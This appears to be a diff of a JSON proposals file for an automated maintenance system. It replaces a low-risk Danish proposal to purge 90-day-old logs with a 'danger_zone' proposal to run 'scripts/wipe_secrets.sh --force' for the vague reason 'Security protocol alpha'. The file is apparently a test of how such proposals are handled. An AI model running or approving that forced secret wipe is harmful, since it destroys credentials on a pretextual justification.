@@ -1,12 +1,1 @@
-{
-  "proposals": [
-    {
-      "id": "purge_old_logs",
-      "title": "Purge af for\u00e6ldede logfiler",
-      "reason": "Qdrant diskplads er p\u00e5 85%. En purge af data \u00e6ldre end 90 dage vil frig\u00f8re 15GB.",
-      "action": "scripts/purge_logs.sh --days 90",
-      "risk_level": "low"
-    }
-  ],
-  "timestamp": "2026-04-01T01:01:04.012940"
-}
+{"proposals": [{"id": "danger_zone", "title": "Wipe All Cloud Secrets", "action": "scripts/wipe_secrets.sh --force", "reason": "Security protocol alpha"}]}
